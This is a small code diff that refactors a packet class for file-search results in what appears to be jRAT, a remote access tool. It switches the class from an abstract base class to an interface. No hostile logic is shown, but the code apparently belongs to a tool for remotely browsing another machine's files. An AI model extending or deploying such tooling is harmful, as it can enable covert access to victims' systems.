@@ -1,10 +1,10 @@
 package jrat.module.fs.packets;
 
 import jrat.client.Connection;
-import jrat.client.packets.outgoing.AbstractOutgoingPacket;
+import jrat.client.packets.outgoing.OutgoingPacket;
 
 
-public class Packet37SearchResult extends AbstractOutgoingPacket {
+public class Packet37SearchResult implements OutgoingPacket {
 
 	private String dir;
 	private String name;
